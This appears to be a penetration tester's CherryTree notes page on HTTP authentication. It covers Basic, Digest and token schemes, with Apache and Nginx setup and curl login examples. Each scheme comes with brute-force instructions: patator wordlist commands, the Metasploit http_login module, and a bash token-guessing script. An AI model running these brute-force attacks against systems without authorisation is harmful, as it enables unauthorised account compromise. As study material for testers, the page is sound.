<!doctype html>
<html>
<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>HTTP Authentication</title>
  <meta name="generator" content="CherryTree">
  <link rel="stylesheet" href="res/styles3.css" type="text/css" />
</head>
<body>
<div class='page'><strong><h1># HTTP Authentication</h1></strong><br />Login forms are typically developer or framework implemented.<br />However, the HTTP protocol itself also provides a general framework for access control and authentication, and it comes in a few different types.<br /><br />It&#39;s defined here in <a href="https://tools.ietf.org/html/rfc7235">RFC 7235</a><br /><br />• <a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Authentication">https://developer.mozilla.org/en-US/docs/Web/HTTP/Authentication</a><br /><br /><strong><h2>## HTTP Basic Authentication</h2></strong><br />In HTTP Basic authentication, the username and password are base64 encoded.<br />In modern implementations, this is why HTTP Basic must happen over HTTPS - because base64 isn&#39;t secure at all.<br /><br /><strong><h3>### Apache</h3></strong><br />In Apache<br />• <code>.htaccess</code> defines the auth type, the protected folder, and points to <code>.htpasswd</code><br />• <code>.htpasswd</code> contains valid usernames and MD5 hashes of their passwords<br /><br /><strong><h3>### Nginx</h3></strong><br />In Nginx<br />• <code>auth_basic</code> defines the name of the password-protected area.<br />• <code>auth_basic_user_file</code><span style="color:#333333;"> points to a </span><code><span style="color:#333333;">.htpasswd</span></code><span style="color:#333333;"> file containing the encrypted user credentials</span><br /><br /><strong><h3>### Log in</h3></strong><br />You can log in at website prompt when you navigate to the protected directory.<br /><br />Log in via Curl<br /><code>curl --user bob:qwerty http://192.168.88.5</code><br /><br /><strong><h3>### Bruteforce</h3></strong><br />It&#39;s possible to bruteforce HTTP Basic authentication.<br /><br /><strong>#### Metasploit</strong><br />Use the <code>http_login</code> module<br /><br /><strong>#### patator</strong><br /><code>patator http_fuzz url=http://192.225.198.3/dir/ user_pass=bob:FILE0 auth_type=basic 0=/usr/share/metasploit-framework/data/wordlists/unix_passwords.txt -x ignore:code=401</code><br /><br /><strong><h2>## HTTP Digest Authentication</h2></strong><br />In HTTP Digest authentication, the username and password are MD5 hashed with nonce values (arbitrary numbers used only once) .<br />This prevents replay attacks.<br /><br /><strong><h3>### Log in</h3></strong><br />You can log in at website prompt when you navigate to the protected directory.<br /><br />Log in via Curl<br /><code>curl --digest --user alice:password1 http://192.168.88.5</code><br /><br /><strong><h3>### Bruteforce</h3></strong><br />It&#39;s still possible to bruteforce HTTP Digest.<br /><br /><strong>#### Metasploit</strong><br />Use the <code>http_login</code> module<br /><br /><strong>#### Patator</strong><br /><code>patator http_fuzz url=http://192.225.198.3/poc/ user_pass=alice:FILE0 auth_type=digest 0=/usr/share/metasploit-framework/data/wordlists/unix_passwords.txt -x ignore:code=401</code><br /><br /><strong><h2>## Token Authentication</h2></strong><br />Token authentcation is where the user, upon being verified, receives a token in return.<br />They can use this token to access restricted content.<br /><br /><strong><h3>### Log in</h3></strong><br />You log in with tokens by submitting a header.<br /><br />• Token - <code>curl -H &quot;Authorization: Token 123123123&quot; http://$ip</code><br />• OAuth 2 - <code>curl -H &quot;Authorization: OAuth &lt;ACCESS_TOKEN&gt;&quot; http://www.example.com</code><br />• Bearer - <code>curl -H &quot;Authorization: Bearer &lt;ACCESS_TOKEN&gt;&quot; http://www.example.com</code><br /><br /><strong><h3>### Bruteforce</h3></strong><br />I haven&#39;t found a script to bruteforce tokens.<br />Instead, you can use <code>crul</code> inside of a bash bruteforce script.<br /><div class="codebox"><div class="codebox">#!/bin/bash<br />while&nbsp;read&nbsp;token;&nbsp;do<br />&nbsp;&nbsp;&nbsp;&nbsp;content=$(curl&nbsp;-s&nbsp;-H&nbsp;&#39;Authorization:&nbsp;Token&nbsp;&#39;&quot;$token&quot;&nbsp;$1)<br />&nbsp;&nbsp;&nbsp;&nbsp;if&nbsp;echo&nbsp;&quot;$content&quot;&nbsp;|&nbsp;grep&nbsp;-qi&nbsp;&quot;unauth&quot;;&nbsp;then<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;continue<br />&nbsp;&nbsp;&nbsp;&nbsp;else<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;echo&nbsp;&quot;Found&nbsp;token&nbsp;:&nbsp;$token&quot;<br />&nbsp;&nbsp;&nbsp;&nbsp;fi<br />done&nbsp;&lt;$2<br /><br />root@pwn:~#&nbsp;./token-brute.sh&nbsp;&quot;http://192.168.88.5&quot;&nbsp;wordlists/passwords.txt</div></div><br /><br /></div>
</body>
</html>
